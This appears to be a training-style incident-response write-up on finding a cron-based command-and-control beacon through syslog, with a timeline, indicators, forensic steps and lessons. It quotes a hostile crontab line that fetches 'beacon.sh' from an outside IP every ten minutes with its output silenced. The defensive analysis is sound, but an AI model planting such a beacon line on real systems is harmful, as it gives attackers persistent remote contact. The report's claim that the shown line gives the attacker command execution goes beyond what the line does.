# Linux Day 9 — Syslog Deep Dive & C2 Detection

## Objective
Identify active compromise indicators through syslog analysis and detect C2 beaconing.

## Investigation Summary

### Discovery
Syslog grep revealed active cron job executing curl command every 10 minutes:
*/10 * * * * curl http://185.220.101.45/beacon.sh > /dev/null 2>&1

### Timeline
- **May 17, 00:10 UTC** — C2 beaconing first detected in syslog
- **Continuous until present** — Active beacon execution every 10 minutes
- **May 20, 15:30+ UTC** — C2 activity continues (last 30 entries confirmed active)

### Indicators of Compromise
1. **Persistent C2 Job**: Cron job executing external script fetch
2. **External Command & Control**: IP 185.220.101.45 identified as attacker infrastructure
3. **Silenced Output**: `> /dev/null 2>&1` indicates attacker awareness (hiding execution)
4. **Regular Beaconing**: 10-minute interval = practiced attack (not accidental)

### Attack Stage Assessment
- **Confirmed**: C2 Persistence (Stage 5)
- **Suspected but unconfirmed**: Initial Access & Escalation (logs cleaned or rotated)
- **Evidence**: Ubuntu user has cron permission (implies prior escalation)

### Immediate Response Actions
1. **Preserve Evidence** (before removal):
```bash
   sudo cat /var/spool/cron/crontabs/ubuntu > ~/cron_backup.txt
   sudo sha256sum ~/cron_backup.txt
```

2. **Remove Persistence**:
```bash
   sudo rm /var/spool/cron/crontabs/ubuntu
```

3. **Verify Removal**:
```bash
   sudo crontab -u ubuntu -l
```

### Forensic Preservation
- `/var/log/syslog` (full file, hashed)
- `/var/log/auth.log` (full file, hashed)
- Cron job backup (hashed)
- System disk image (for deep analysis)
- Screenshots with timestamps

### Confidence Level
**HIGH** — Multiple independent confirmations:
- Syslog shows 20+ execution instances
- Crontab file confirms persistent mechanism
- Timeline is continuous
- External IP is clearly malicious infrastructure

### Conclusion
System is actively compromised with C2 persistence established. Attacker retains command execution capability through scheduled cron job. Immediate removal of cron job required to interrupt attacker communication. Full forensic analysis needed to determine initial access vector and extent of compromise.

### Key Learnings (Day 9)
1. **Syslog reveals behavior** — auth.log shows access, syslog shows actions
2. **Beaconing is discoverable** — Regular intervals create detectable patterns
3. **Cron persistence is common** — Check `crontab -u [user] -l` on ALL users
4. **Log preservation precedes action** — Never remove evidence before backing it up
5. **Correlation matters** — One log type shows symptom, another shows cause
